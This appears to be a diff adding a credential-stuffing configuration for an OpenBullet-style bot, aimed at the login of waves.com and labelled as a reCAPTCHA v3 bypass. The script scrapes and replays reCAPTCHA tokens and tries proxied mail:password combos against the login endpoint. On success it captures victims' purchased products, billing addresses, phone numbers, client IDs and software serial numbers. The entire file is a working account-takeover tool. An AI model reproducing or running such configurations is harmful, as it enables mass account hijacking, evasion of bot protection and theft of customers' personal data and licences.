@@ -1,0 +1,213 @@
+[SETTINGS]
+{
+  "Name": "Waves.com (Recaptcha v3 BYPASS)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-16T16:37:04.6250767+04:00",
+  "AdditionalInfo": "FULL CAPTURE",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CONECT REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeG-IcUAAAAAIb42eguHdUztlZNcrLPhuk81WSM&co=aHR0cHM6Ly93d3cud2F2ZXMuY29tOjQ0Mw..&hl=en&v=85AXn53af-oJBEtL2o2WpAjZ&size=invisible&cb=ib6c61km532d" 
+  
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "type=\"hidden\" id=\"recaptcha-token\" value=\"" "\"" -> VAR "TK" 
+
+#POST REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LeG-IcUAAAAAIb42eguHdUztlZNcrLPhuk81WSM" 
+  CONTENT "v=85AXn53af-oJBEtL2o2WpAjZ&reason=q&c=<TK>&k=6LeG-IcUAAAAAIb42eguHdUztlZNcrLPhuk81WSM&co=aHR0cHM6Ly93d3cud2F2ZXMuY29tOjQ0Mw..&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7" 
+  HEADER "content-length: 5628" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+#TR PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "TR" 
+
+#LOGIN REQUEST POST "https://www.waves.com/2code/handlers/cart/cart-login.aspx?refferer=cart" 
+  CONTENT "{\"psw\":\"<PASS>\",\"rememberMe\":true,\"username\":\"<USER>\",\"recaptcha\":\"<TR>\",\"captchaVersion\":3,\"ref\":\"login-page\"}" 
+  CONTENTTYPE "text/plain" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 591" 
+  HEADER "content-type: text/plain;charset=UTF-8" 
+  HEADER "origin: https://www.waves.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.waves.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"StatusType\":0" 
+    KEY "\"ErrorMessage\":\"Incorrect username or password\"" 
+    KEY "\"userName\":\"public\"" 
+    KEY "\"IsValid\":false}" 
+  KEYCHAIN Success OR 
+    KEY "\"IsValid\":true}" 
+    KEY "\"ErrorMessage\":\"\"" 
+    KEY "\"userName\":\"<USER>\"" 
+
+#GET_USER REQUEST GET "https://www.waves.com/2code/handlers/account/user-registered-products.ashx" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.waves.com/account" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+#purchasedProducts PARSE "<SOURCE>" LR "{\"purchasedProducts\":[" "]" CreateEmpty=FALSE -> CAP "purchasedProducts" 
+
+#CT FUNCTION CurrentUnixTime -> VAR "CT" 
+
+#GET_CART REQUEST GET "https://www.waves.com/2code/handlers/cart/cart-items.aspx?gaGUID=762884104&_=<CT>" 
+  
+  HEADER "referer: https://www.waves.com/account/products" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"CSRFUserToken\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "\"CSRFUserToken\":\"" 
+
+#id PARSE "<SOURCE>" LR "\"id\":" "," -> VAR "id" 
+
+#Total PARSE "<SOURCE>" LR "\"id\":<id>,\"total\":" "," CreateEmpty=FALSE -> CAP "Total" 
+
+#instantSavings PARSE "<SOURCE>" JSON "instantSavings" CreateEmpty=FALSE -> CAP "instantSavings" 
+
+#couponDiscount PARSE "<SOURCE>" JSON "couponDiscount" CreateEmpty=FALSE -> CAP "couponDiscount" 
+
+#yousave PARSE "<SOURCE>" JSON "yousave" CreateEmpty=FALSE -> CAP "yousave" 
+
+#couponCode PARSE "<SOURCE>" JSON "couponCode" CreateEmpty=FALSE -> CAP "couponCode" 
+
+#couponNumber PARSE "<SOURCE>" JSON "couponNumber" CreateEmpty=FALSE -> CAP "couponNumber" 
+
+#couponMsg PARSE "<SOURCE>" JSON "couponMsg" -> VAR "couponMsg" 
+
+#isCouponBoxOpened PARSE "<SOURCE>" JSON "isCouponBoxOpened" CreateEmpty=FALSE -> CAP "isCouponBoxOpened" 
+
+#isMultiVoucher PARSE "<SOURCE>" JSON "isMultiVoucher" CreateEmpty=FALSE -> CAP "isMultiVoucher" 
+
+#containsGiftCardProduct PARSE "<SOURCE>" LR "containsGiftCardProduct\":" "}" CreateEmpty=FALSE -> CAP "containsGiftCardProduct" 
+
+#Products PARSE "<SOURCE>" LR "\"name\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Products" 
+
+#Products_Price PARSE "<SOURCE>" JSON "price" Recursive=TRUE CreateEmpty=FALSE -> CAP "Products Price" 
+
+#Days_Left PARSE "<SOURCE>" JSON "numberOfFreeDays" CreateEmpty=FALSE -> CAP "Days Left" 
+
+#billTo PARSE "<SOURCE>" LR "address\":{\"billTo\":\"" "\"" CreateEmpty=FALSE -> CAP "billTo" 
+
+#billingAddr1 PARSE "<SOURCE>" LR "\"billingAddr1\":\"" "\"" CreateEmpty=FALSE -> CAP "billingAddr1" 
+
+#billingAddr2 PARSE "<SOURCE>" JSON "billingAddr2" CreateEmpty=FALSE -> CAP "billingAddr2" 
+
+#billingCity PARSE "<SOURCE>" JSON "billingCity" CreateEmpty=FALSE -> CAP "billingCity" 
+
+#billingCountryCode PARSE "<SOURCE>" JSON "billingCountryDisplayName" CreateEmpty=FALSE -> CAP "billingCountryCode" 
+
+#billingZipCode PARSE "<SOURCE>" JSON "billingZipCode" CreateEmpty=FALSE -> CAP "billingZipCode" 
+
+#billingPhoneCode PARSE "<SOURCE>" JSON "billingPhoneCode" -> VAR "billingPhoneCode" "+" "" 
+
+#billingPhone PARSE "<SOURCE>" JSON "billingPhone" -> VAR "billingPhone" "<billingPhoneCode>" "" 
+
+#Total_Orders PARSE "<SOURCE>" LR "\"NumOfOrders\":" "}" CreateEmpty=FALSE -> CAP "Total Orders" 
+
+#wavesClientID PARSE "<SOURCE>" JSON "wavesClientID" CreateEmpty=FALSE -> CAP "wavesClientID" 
+
+#GET_SERIALNUMBER REQUEST GET "https://www.waves.com/2code/handlers/cart/waves-upg.ashx?action=list" 
+  
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.waves.com/account/upgrades" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+#SerialNumber PARSE "<SOURCE>" JSON "SerialNumber" CreateEmpty=FALSE -> CAP "SerialNumber" 
+
+#UpgradePrice PARSE "<SOURCE>" LR "{\"UpgradePrice\":" "," CreateEmpty=FALSE -> CAP "UpgradePrice" 
+
+#CostPerPlugin PARSE "<SOURCE>" JSON "CostPerPlugin" CreateEmpty=FALSE -> CAP "CostPerPlugin" 
+
+#Total_NewPlugins PARSE "<SOURCE>" JSON "NumberOfNewPlugins" CreateEmpty=FALSE -> CAP "Total NewPlugins" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+#CHECK_SERIALNUMBER KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You own no products from which to upgrade." 
+    KEY "\"SerialNumber\":null" 
+    KEY "<Total NewPlugins>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "You own no products from which to upgrade." 
+    KEY "<SOURCE>" DoesNotContain "\"SerialNumber\":null" 
+    KEY "<Total NewPlugins>" GreaterThan "1" 
+
